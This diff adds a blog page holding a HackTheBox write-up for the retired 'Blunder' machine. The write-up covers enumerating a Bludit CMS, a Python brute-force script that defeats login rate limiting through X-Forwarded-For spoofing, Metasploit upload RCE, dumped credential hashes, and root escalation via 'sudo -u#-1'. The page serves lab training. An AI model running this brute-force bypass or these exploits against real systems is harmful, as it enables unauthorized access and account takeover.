@@ -1,0 +1,655 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+
+    <title>HTB Write-up  | Blunder</title>
+    <meta name="HandheldFriendly" content="True" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+    <link rel="stylesheet" type="text/css" href="/assets/built/screen.css?v=a7e4dafcdc" />
+
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <link rel="canonical" href="https://inesmartins.github.io//htb-write-up-blunder/" />
+    <meta name="referrer" content="no-referrer-when-downgrade" />
+    <link rel="amphtml" href="https://inesmartins.github.io//htb-write-up-blunder/amp/" />
+    
+    <meta property="og:site_name" content="Inês Martins" />
+    <meta property="og:type" content="article" />
+    <meta property="og:title" content="HTB Write-up  | Blunder" />
+    <meta property="og:description" content="Retired machine can be found here. ScanningScanning with nmap only retrieved an Apache web server on port 80. ~ nmap -sV -sC -A blunder.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 10:13 WEST Nmap scan report for blunder.htb (10.10.10.191) Host is up (0." />
+    <meta property="og:url" content="https://inesmartins.github.io//htb-write-up-blunder/" />
+    <meta property="og:image" content="https://inesmartins.github.io//content/images/2020/06/infocard.png" />
+    <meta property="article:published_time" content="2020-10-22T08:50:44.000Z" />
+    <meta property="article:modified_time" content="2020-10-22T08:50:44.000Z" />
+    <meta property="article:tag" content="htb" />
+    <meta property="article:tag" content="bludit" />
+    <meta property="article:tag" content="cms" />
+    <meta property="article:tag" content="cewl" />
+    <meta property="article:tag" content="apache" />
+    
+    <meta name="twitter:card" content="summary_large_image" />
+    <meta name="twitter:title" content="HTB Write-up  | Blunder" />
+    <meta name="twitter:description" content="Retired machine can be found here. ScanningScanning with nmap only retrieved an Apache web server on port 80. ~ nmap -sV -sC -A blunder.htb Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 10:13 WEST Nmap scan report for blunder.htb (10.10.10.191) Host is up (0." />
+    <meta name="twitter:url" content="https://inesmartins.github.io//htb-write-up-blunder/" />
+    <meta name="twitter:image" content="https://inesmartins.github.io//content/images/2020/06/infocard.png" />
+    <meta name="twitter:label1" content="Written by" />
+    <meta name="twitter:data1" content="Inês Martins" />
+    <meta name="twitter:label2" content="Filed under" />
+    <meta name="twitter:data2" content="htb, bludit, cms, cewl, apache" />
+    <meta name="twitter:site" content="@inesmartns" />
+    <meta property="og:image:width" content="598" />
+    <meta property="og:image:height" content="378" />
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Inês Martins",
+        "url": "https://inesmartins.github.io//",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://inesmartins.github.io//favicon.ico",
+            "width": 48,
+            "height": 48
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "Inês Martins",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://inesmartins.github.io//content/images/2020/07/0PFUtbOg_400x400.jpg",
+            "width": 400,
+            "height": 400
+        },
+        "url": "https://inesmartins.github.io//author/ines/",
+        "sameAs": []
+    },
+    "headline": "HTB Write-up  | Blunder",
+    "url": "https://inesmartins.github.io//htb-write-up-blunder/",
+    "datePublished": "2020-10-22T08:50:44.000Z",
+    "dateModified": "2020-10-22T08:50:44.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://inesmartins.github.io//content/images/2020/06/infocard.png",
+        "width": 598,
+        "height": 378
+    },
+    "keywords": "htb, bludit, cms, cewl, apache",
+    "description": "Retired machine can be found here\n[https://www.hackthebox.eu/home/machines/profile/254].\n\nScanning\nScanning with nmap only retrieved an Apache web server on port 80.\n\n~ nmap -sV -sC -A blunder.htb\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 10:13 WEST\nNmap scan report for blunder.htb (10.10.10.191)\nHost is up (0.48s latency).\nNot shown: 998 filtered ports\nPORT   STATE  SERVICE VERSION\n21/tcp closed ftp\n80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-generator: Blunder\n|_htt",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "https://inesmartins.github.io//"
+    }
+}
+    </script>
+
+    <meta name="generator" content="Ghost 3.18" />
+    <link rel="alternate" type="application/rss+xml" title="Inês Martins" href="https://inesmartins.github.io//rss/" />
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-180659126-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-180659126-1');
+</script>
+
+</head>
+<body class="post-template tag-htb tag-bludit tag-cms tag-cewl tag-apache">
+
+    <div class="site-wrapper">
+
+        
+
+<header class="site-header">
+    <div class="outer site-nav-main">
+    <div class="inner">
+        <nav class="site-nav">
+    <div class="site-nav-left-wrapper">
+        <div class="site-nav-left">
+                <a class="site-nav-logo" href="https://inesmartins.github.io/">Inês Martins</a>
+            <div class="site-nav-content">
+                    <ul class="nav">
+    <li class="nav-home"><a href="https://inesmartins.github.io//">Home</a></li>
+</ul>
+
+                    <span class="nav-post-title dash">HTB Write-up  | Blunder</span>
+            </div>
+        </div>
+    </div>
+    <div class="site-nav-right">
+            <div class="social-links">
+                    <a class="social-link social-link-tw" href="https://twitter.com/inesmartns" title="Twitter" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path d="M30.063 7.313c-.813 1.125-1.75 2.125-2.875 2.938v.75c0 1.563-.188 3.125-.688 4.625a15.088 15.088 0 0 1-2.063 4.438c-.875 1.438-2 2.688-3.25 3.813a15.015 15.015 0 0 1-4.625 2.563c-1.813.688-3.75 1-5.75 1-3.25 0-6.188-.875-8.875-2.625.438.063.875.125 1.375.125 2.688 0 5.063-.875 7.188-2.5-1.25 0-2.375-.375-3.375-1.125s-1.688-1.688-2.063-2.875c.438.063.813.125 1.125.125.5 0 1-.063 1.5-.25-1.313-.25-2.438-.938-3.313-1.938a5.673 5.673 0 0 1-1.313-3.688v-.063c.813.438 1.688.688 2.625.688a5.228 5.228 0 0 1-1.875-2c-.5-.875-.688-1.813-.688-2.75 0-1.063.25-2.063.75-2.938 1.438 1.75 3.188 3.188 5.25 4.25s4.313 1.688 6.688 1.813a5.579 5.579 0 0 1 1.5-5.438c1.125-1.125 2.5-1.688 4.125-1.688s3.063.625 4.188 1.813a11.48 11.48 0 0 0 3.688-1.375c-.438 1.375-1.313 2.438-2.563 3.188 1.125-.125 2.188-.438 3.313-.875z"/></svg>
+</a>
+            </div>
+                <a class="rss-button" href="https://feedly.com/i/subscription/feed/https://inesmartins.github.io//rss/" title="RSS" target="_blank" rel="noopener"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><circle cx="6.18" cy="17.82" r="2.18"/><path d="M4 4.44v2.83c7.03 0 12.73 5.7 12.73 12.73h2.83c0-8.59-6.97-15.56-15.56-15.56zm0 5.66v2.83c3.9 0 7.07 3.17 7.07 7.07h2.83c0-5.47-4.43-9.9-9.9-9.9z"/></svg>
+</a>
+
+    </div>
+</nav>
+    </div>
+</div></header>
+
+
+<main id="site-main" class="site-main outer">
+    <div class="inner">
+
+        <article class="post-full post tag-htb tag-bludit tag-cms tag-cewl tag-apache ">
+
+            <header class="post-full-header">
+
+                <section class="post-full-tags">
+                    <a href="/tag/htb/">htb</a>
+                </section>
+
+                <h1 class="post-full-title">HTB Write-up  | Blunder</h1>
+
+
+                <div class="post-full-byline">
+
+                    <section class="post-full-byline-content">
+
+                        <ul class="author-list">
+                            <li class="author-list-item">
+
+                                <div class="author-card">
+                                    <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
+                                    <div class="author-info">
+                                        <h2>Inês Martins</h2>
+                                        <p>Read <a href="/author/ines/">more posts</a> by this author.</p>
+                                    </div>
+                                </div>
+
+                                <a href="/author/ines/" class="author-avatar">
+                                    <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
+                                </a>
+
+                            </li>
+                        </ul>
+
+                        <section class="post-full-byline-meta">
+                            <h4 class="author-name"><a href="/author/ines/">Inês Martins</a></h4>
+                            <div class="byline-meta-content">
+                                <time class="byline-meta-date" datetime="2020-10-22">22 Oct 2020</time>
+                                <span class="byline-reading-time"><span class="bull">&bull;</span> 5 min read</span>
+                            </div>
+                        </section>
+
+                    </section>
+
+
+                </div>
+            </header>
+
+            <figure class="post-full-image">
+                <img
+                    srcset="/content/images/size/w300/2020/06/infocard.png 300w,
+                            /content/images/size/w600/2020/06/infocard.png 600w,
+                            /content/images/size/w1000/2020/06/infocard.png 1000w,
+                            /content/images/size/w2000/2020/06/infocard.png 2000w"
+                    sizes="(max-width: 800px) 400px,
+                        (max-width: 1170px) 1170px,
+                            2000px"
+                    src="/content/images/size/w2000/2020/06/infocard.png"
+                    alt="HTB Write-up  | Blunder"
+                />
+            </figure>
+
+            <section class="post-full-content">
+                <div class="post-content">
+                    <p><em>Retired machine can be found <a href="https://www.hackthebox.eu/home/machines/profile/254">here</a>.</em></p><h2 id="scanning">Scanning</h2><p>Scanning with <code>nmap</code> only retrieved an Apache web server on port 80.</p><!--kg-card-begin: markdown--><pre><code>~ nmap -sV -sC -A blunder.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-12 10:13 WEST
+Nmap scan report for blunder.htb (10.10.10.191)
+Host is up (0.48s latency).
+Not shown: 998 filtered ports
+PORT   STATE  SERVICE VERSION
+21/tcp closed ftp
+80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: Blunder
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Blunder | A blunder of interesting facts
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 100.87 seconds
+</code></pre>
+<!--kg-card-end: markdown--><p>The <a href="http://blunder.htb/">Home</a> and <a href="http://10.10.10.191/about">About</a> pages are very simple, just a couple of posts that don't seem very relevant, but from the source code we can tell this blog was created using version 3.9.2. of the <a href="https://www.bludit.com/">Bludit CMS</a>.</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/home-1.png" class="kg-image"></figure><h3 id="checking-for-bludit-vulnerabilities">Checking for Bludit Vulnerabilities</h3><p>As with most Bludit-based applications, this one has an <a href="http://blunder.htb/admin/">admin page</a>:</p><figure class="kg-card kg-image-card"><img src="https://inesmartins.github.io//content/images/2020/06/admin-1.png" class="kg-image"></figure><p>After checking for <a href="https://www.cvedetails.com/vulnerability-list.php?vendor_id=17229&amp;product_id=41420&amp;version_id=&amp;page=1&amp;hasexp=0&amp;opdos=0&amp;opec=0&amp;opov=0&amp;opcsrf=0&amp;opgpriv=0&amp;opsqli=0&amp;opxss=0&amp;opdirt=0&amp;opmemc=0&amp;ophttprs=0&amp;opbyp=0&amp;opfileinc=0&amp;opginf=0&amp;cvssscoremin=0&amp;cvssscoremax=0&amp;year=0&amp;month=0&amp;cweid=0&amp;order=3&amp;trc=8&amp;sha=012a032fbb16ed1554a64233f60621639d4bf196">vulnerabilities</a> there is only 1 that matches this version and seems interesting:</p><blockquote><a href="https://www.cvedetails.com/cve/CVE-2019-16113/">CVE-2019-16113</a>: "remote code execution via <a href="http://blunder.htb/bl-kernel/ajax/upload-images.php">bl-kernel/ajax/upload-images.php</a> because PHP code can be entered with a .jpg file name, and then this PHP code can write other PHP code to a ../ pathname."</blockquote><p>From the CVE Details page we also know there's a <a href="https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec">Metasploit module</a> linked to this CVE, however, this module <strong>requires us to know user and pass</strong>.</p><!--kg-card-begin: markdown--><pre><code>msf5 &gt; use exploit/linux/http/bludit_upload_images_exec
+
+msf5 exploit(linux/http/bludit_upload_images_exec) &gt; show info
+...
+Description:
+  This module exploits a vulnerability in Bludit. A remote user could 
+  abuse the uuid parameter in the image upload feature in order to 
+  save a malicious payload anywhere onto the server, and then use a 
+  custom .htaccess file to bypass the file extension check to finally 
+  get remote code execution.
+</code></pre>
+<!--kg-card-end: markdown--><p>We don't know the credentials but according to <a href="https://github.com/bludit/bludit/issues/1026">this open Github issue</a>, we do know that the username is <code>admin</code><strong> </strong>by default, which means we might be able to brute-force the password.</p><h3 id="bypassing-brute-force-protection">Bypassing Brute Force Protection</h3><p>When I tried to brute-force the password using <a href="https://portswigger.net/burp">Burp</a>, only the first request seemed to be processed correctly, the following requests all returned <code>301</code>. </p><p>After a bit of Googling, I realised this is caused by Bludit's "<a href="https://docs.bludit.com/en/security/brute-force-protection">Brute Force Protection</a>" feature, that's present on all versions after 3.9.2. </p><p>Luckily, some more Googling produced a very useful <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">article</a> that tells us how to bypass this mechanism. Turns out, the application determines the user's IP by trusting the <code>X-Forwarded-For</code> and <code>Client-IP</code> HTTP headers. Once Bludit detects more than x failed authentication requests (this number is configurable), it starts rejecting the authentication requests.</p><p>Since there's no validation that the IP is valid, we can simply pass the password as the <code>X-Forwarded-For</code> param, and then we can try to brute-force the passwords:</p><pre><code class="language-python">#!/usr/bin/env python3
+import re
+import requests
+
+host = 'http://blunder.htb'
+login_url = host + '/admin/login'
+username = 'admin'
+pwd_file = "wordlist.txt"
+
+# read passwords from file and adds them to wordlist array
+wordlist = []
+file = open(pwd_file, "r")
+for line in file: 
+    wordlist.append(line.strip())
+
+for password in wordlist:
+    session = requests.Session()
+    login_page = session.get(login_url)
+    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)
+
+    print('[*] Trying: {p}'.format(p = password))
+
+    headers = {
+        'X-Forwarded-For': password,
+        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
+        'Referer': login_url
+    }
+
+    data = {
+        'tokenCSRF': csrf_token,
+        'username': username,
+        'password': password,
+        'save': ''
+    }
+
+    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)
+
+    if 'location' in login_result.headers:
+        if '/admin/dashboard' in login_result.headers['location']:
+            print()
+            print('SUCCESS: Password found!')
+            print('Use {u}:{p} to login.'.format(u = username, p = password))
+            print()
+            break</code></pre><p>None of the usual wordlists worked, so, following a tip from the <a href="https://forum.hackthebox.eu/discussion/3363/official-blunder-discussion/p9">Forum</a> I decided to create a custom wordlist from the website using <a href="https://tools.kali.org/password-attacks/cewl">CeWL</a>:</p><!--kg-card-begin: markdown--><pre><code>$ cewl -d 1 -m 5 -w blunder-wordlist.txt http://blunder.htb
+</code></pre>
+<!--kg-card-end: markdown--><ul><li><code>-d</code> indicates the max scan depth;</li><li><code>-m</code> is the minimum word length;</li><li><code>-w</code> file where the wordlist will be written to.</li></ul><p>Unfortunately, this also failed, so I went back fuzzing.</p><h3 id="fuzzing-for-credentials">Fuzzing for Credentials</h3><p>It took a while but we finally found something interesting:</p><!--kg-card-begin: markdown--><pre><code>$ wfuzz -w common.txt --hc 404 http://blunder.htb/FUZZ.txt
+...
+000004125:   200        4 L      23 W     118 Ch      &quot;todo&quot;
+...
+</code></pre>
+<!--kg-card-end: markdown--><p>The <a href="http://blunder.htb/todo.txt">todo file</a> contains the following information:</p><!--kg-card-begin: markdown--><pre><code>-Update the CMS
+-Turn off FTP - DONE
+-Remove old users - DONE
+-Inform fergus that the new blog needs images - PENDING
+</code></pre>
+<!--kg-card-end: markdown--><p>So, some interesting new information:</p><ul><li>there is an <code>FTP</code> service configured on this machine;</li><li>there is someone named <code>fergus</code> that might correspond to a user name;</li></ul><p>So, again we try to brute-force the password but now for the user <code>fergus</code>.</p><!--kg-card-begin: markdown--><pre><code>$ python3 bludit-bruteforce.py
+...
+SUCCESS: Password found!
+Use fergus:RolandDeschain to login.
+</code></pre>
+<!--kg-card-end: markdown--><hr><h2 id="getting-user">Getting User</h2><p>Now that we have valid credentials for <code>fergus</code>, we can test the <a href="https://www.rapid7.com/db/modules/exploit/linux/http/bludit_upload_images_exec">Metasploit module</a> we found previously. After changing the payload, we're in!</p><pre><code>meterpreter &gt; getuid
+Server username: www-data (33)
+
+meterpreter &gt; sysinfo
+Computer    : blunder
+OS          : Linux blunder 5.3.0-53-generic #47-Ubuntu SMP Thu May 7 12:18:16 UTC 2020 x86_64
+Meterpreter : php/linux</code></pre><p>Now that we have access to the blog's source files, we can read the <code>users.php</code> database:</p><pre><code>&gt; cat databases/users.php
+
+&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
+{
+    "admin": {
+        "nickname": "Admin",
+        "firstName": "Administrator",
+        "lastName": "",
+        "role": "admin",
+        "password": "bfcc887f62e36ea019e3295aafb8a3885966e265",
+        "salt": "5dde2887e7aca",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        ...
+    },
+    "fergus": {
+        "firstName": "&amp;quot; or 1=1 #",
+        "lastName": "&amp;quot; or 1=1 #",
+        "nickname": "&amp;quot; or 1=1 #",
+        "description": "",
+        "role": "author",
+        "password": "be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7",
+        "salt": "jqxpjfnv",
+        "email": "&amp;quot; or 1=1 #",
+        "registered": "2019-11-27 13:26:44",
+        "tokenRemember": "73a6fca50fe0ad2edb1390e0a1bfb8b5",
+        "tokenAuth": "0e8011811356c0c5bd2211cba8c50471",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        ...
+    }
+}</code></pre><p>There is also a folder for another version of the application, which contains a different version of the <code>users.php</code> database:</p><pre><code>cat /var/www/bludit-3.10.0a/bl-content/databases/users.php
+&lt;?php defined('BLUDIT') or die('Bludit CMS.'); ?&gt;
+{
+    "admin": {
+        "nickname": "Hugo",
+        "firstName": "Hugo",
+        "lastName": "",
+        "role": "User",
+        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",
+        "email": "",
+        "registered": "2019-11-27 07:40:55",
+        "tokenRemember": "",
+        "tokenAuth": "b380cb62057e9da47afce66b4615107d",
+        "tokenAuthTTL": "2009-03-15 14:00",
+        ...
+}</code></pre><p>So, we now have the following credentials:</p><!--kg-card-begin: markdown--><table>
+<thead>
+<tr>
+<th>username</th>
+<th>hash</th>
+<th>salt</th>
+<th>password</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>fergus</td>
+<td>bfcc887f62e36ea019e3295aafb8a3885966e265</td>
+<td>5dde2887e7aca</td>
+<td>RolandDeschain</td>
+</tr>
+<tr>
+<td>admin</td>
+<td>be5e169cdf51bd4c878ae89a0a89de9cc0c9d8c7</td>
+<td>jqxpjfnv</td>
+<td></td>
+</tr>
+<tr>
+<td>admin (hugo)</td>
+<td>faca404fd5c0a31cf1897b823c695c85cffeb98d</td>
+<td></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<!--kg-card-end: markdown--><p>This last user is particularly interesting because <code>hugo</code> is one of the users that have a directory on the <code>home</code> dir:</p><pre><code>Listing: /home
+==============
+
+Mode             Size  Type  Last modified              Name
+----             ----  ----  -------------              ----
+40755/rwxr-xr-x  4096  dir   2020-05-26 09:29:29 +0100  hugo
+40755/rwxr-xr-x  4096  dir   2020-04-28 12:13:35 +0100  shaun</code></pre><p>After some googling, I realised hugo's password is just a non-salted <code>SHA-1</code> hash for <code>Password120</code>. Let's authenticate as <code>hugo</code>:</p><pre><code>meterpreter &gt; shell
+Process 32464 created.
+Channel 10 created.
+su - hugo
+Password: Password120
+
+cat user.txt
+c0c23698b18cc480ebd74fd6570281ef</code></pre><hr><h2 id="getting-root">Getting root</h2><p>This is one of those instances of starting with the <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14287">low-hanging fruit:</a></p><pre><code>hugo@blunder:~$ sudo -u#-1 bash
+sudo -u#-1 bash
+Password: Password120
+
+root@blunder:/home/hugo# cat /root/root.txt
+cat /root/root.txt
+6ffe09ebd667f8eb04c6c65b6260e6ce
+root@blunder:/home/hugo#</code></pre><p>That's it! Hope you enjoyed it!</p>
+                </div>
+            </section>
+
+
+
+        </article>
+
+    </div>
+</main>
+
+<aside class="read-next outer">
+    <div class="inner">
+        <div class="read-next-feed">
+                <article class="read-next-card">
+                    <header class="read-next-card-header">
+                        <h3><span>More in</span> <a href="/tag/htb/">htb</a></h3>
+                    </header>
+                    <div class="read-next-card-content">
+                        <ul>
+                            <li>
+                                <h4><a href="/htb-write-up-cache/">HTB Write-up | Cache</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-10-22">22 Oct 2020</time> –
+                                        9 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="/htb-write-up-traceback/">HTB Write-up | Traceback</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-08-27">27 Aug 2020</time> –
+                                        4 min read</p>
+                                </div>
+                            </li>
+                            <li>
+                                <h4><a href="/htb-walkthrough-resolute-user/">HTB Write-up | Resolute</a></h4>
+                                <div class="read-next-card-meta">
+                                    <p><time datetime="2020-06-08">8 Jun 2020</time> –
+                                        3 min read</p>
+                                </div>
+                            </li>
+                        </ul>
+                    </div>
+                    <footer class="read-next-card-footer">
+                        <a href="/tag/htb/">See all 3 posts
+                            →</a>
+                    </footer>
+                </article>
+
+                <article class="post-card post tag-htb tag-linux tag-cache tag-memcached tag-privesc tag-docker tag-openemr ">
+
+    <a class="post-card-image-link" href="/htb-write-up-cache/">
+        <img class="post-card-image"
+            srcset="/content/images/size/w300/2020/10/cache.png 300w,
+                    /content/images/size/w600/2020/10/cache.png 600w,
+                    /content/images/size/w1000/2020/10/cache.png 1000w,
+                    /content/images/size/w2000/2020/10/cache.png 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            loading="lazy"
+            src="/content/images/size/w600/2020/10/cache.png"
+            alt="HTB Write-up | Cache"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/htb-write-up-cache/">
+
+            <header class="post-card-header">
+                    <div class="post-card-primary-tag">htb</div>
+                <h2 class="post-card-title">HTB Write-up | Cache</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>Retired machine can be found here. ScanningWe start with our usual scanning which finds only an instance of OpenSSH running on port 22 and an Apache server running on port</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        Inês Martins
+                    </div>
+            
+                    <a href="/author/ines/" class="static-avatar">
+                        <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="/author/ines/">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-10-22">22 Oct 2020</time> <span class="bull">&bull;</span> 9 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+
+                <article class="post-card post tag-sstv tag-piet tag-esolang tag-misc tag-ctf tag-oposec ">
+
+    <a class="post-card-image-link" href="/oposec-summer-challenge-2020/">
+        <img class="post-card-image"
+            srcset="/content/images/size/w300/2020/09/heading3.png 300w,
+                    /content/images/size/w600/2020/09/heading3.png 600w,
+                    /content/images/size/w1000/2020/09/heading3.png 1000w,
+                    /content/images/size/w2000/2020/09/heading3.png 2000w"
+            sizes="(max-width: 1000px) 400px, 700px"
+            loading="lazy"
+            src="/content/images/size/w600/2020/09/heading3.png"
+            alt="ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up"
+        />
+    </a>
+
+    <div class="post-card-content">
+
+        <a class="post-card-content-link" href="/oposec-summer-challenge-2020/">
+
+            <header class="post-card-header">
+                    <div class="post-card-primary-tag">sstv</div>
+                <h2 class="post-card-title">ØxOPOSɆC Summer Challenge 2020 | Misc Challenges Write-up</h2>
+            </header>
+
+            <section class="post-card-excerpt">
+                    <p>1 . My Paste | 100Oh no! I forgot where I left my paste. 🗑 Perhaps you can help me find it?The source code has a little hidden clue: &lt;span class=</p>
+            </section>
+
+        </a>
+
+        <footer class="post-card-meta">
+            <ul class="author-list">
+                <li class="author-list-item">
+            
+                    <div class="author-name-tooltip">
+                        Inês Martins
+                    </div>
+            
+                    <a href="/author/ines/" class="static-avatar">
+                        <img class="author-profile-image" src="/content/images/size/w100/2020/07/0PFUtbOg_400x400.jpg" alt="Inês Martins" />
+                    </a>
+                </li>
+            </ul>
+            <div class="post-card-byline-content">
+                <span><a href="/author/ines/">Inês Martins</a></span>
+                <span class="post-card-byline-date"><time datetime="2020-09-25">25 Sep 2020</time> <span class="bull">&bull;</span> 3 min read</span>
+            </div>
+        </footer>
+
+    </div>
+
+</article>
+        </div>
+    </div>
+</aside>
+
+
+
+
+        <footer class="site-footer outer">
+            <div class="site-footer-content inner">
+                <section class="copyright"><a href="https://inesmartins.github.io/">Inês Martins</a> &copy; 2020</section>
+                <nav class="site-footer-nav">
+                    <a href="https://inesmartins.github.io/">Latest Posts</a>
+                    
+                    <a href="https://twitter.com/inesmartns" target="_blank" rel="noopener">Twitter</a>
+                    <a href="https://ghost.org" target="_blank" rel="noopener">Ghost</a>
+                </nav>
+            </div>
+        </footer>
+
+    </div>
+
+
+    <script
+        src="https://code.jquery.com/jquery-3.4.1.min.js"
+        integrity="sha256-CSXorXvZcTkaix6Yvo6HppcZGetbYMGWSFlBw8HfCJo="
+        crossorigin="anonymous">
+    </script>
+    <script src="/assets/built/casper.js?v=a7e4dafcdc"></script>
+
+    <script>
+        // Parse the URL parameter
+        function getParameterByName(name, url) {
+            if (!url) url = window.location.href;
+            name = name.replace(/[\[\]]/g, "\\$&");
+            var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
+                results = regex.exec(url);
+            if (!results) return null;
+            if (!results[2]) return '';
+            return decodeURIComponent(results[2].replace(/\+/g, " "));
+        }
+
+        // Give the parameter a variable name
+        var action = getParameterByName('action');
+
+        $(document).ready(function () {
+            if (action == 'subscribe') {
+                $('body').addClass("subscribe-success");
+            }
+
+            $('.subscribe-success-message .subscribe-close').click(function () {
+                $('.subscribe-success-message').addClass('close');
+            });
+
+            // Reset form on opening subscrion overlay
+            $('.subscribe-button').click(function() {
+                $('.subscribe-overlay form').removeClass();
+                $('.subscribe-email').val('');
+            });
+        });
+    </script>
+
+    <script>
+    $(document).ready(function () {
+        // FitVids - start
+        var $postContent = $(".post-full-content");
+        $postContent.fitVids();
+        // FitVids - end
+
+        // Replace nav with title on scroll - start
+        Casper.stickyNavTitle({
+            navSelector: '.site-nav-main',
+            titleSelector: '.post-full-title',
+            activeClass: 'nav-post-title-active'
+        });
+        // Replace nav with title on scroll - end
+
+        // Hover on avatar
+        var hoverTimeout;
+        $('.author-list-item').hover(function () {
+            var $this = $(this);
+
+            clearTimeout(hoverTimeout);
+
+            $('.author-card').removeClass('hovered');
+            $(this).children('.author-card').addClass('hovered');
+
+        }, function () {
+            var $this = $(this);
+
+            hoverTimeout = setTimeout(function () {
+                $this.children('.author-card').removeClass('hovered');
+            }, 800);
+        });
+    });
+</script>
+
+
+    <div class="site-footer outer" style="background:#090a0b;margin-top:-60px;">
+    <div class="site-footer-content footer inner" style="margin-bottom:-20px">
+        <script src="https://www.hackthebox.eu/badge/172261"></script>
+    </div>
+</div>
+
+</body>
+</html>
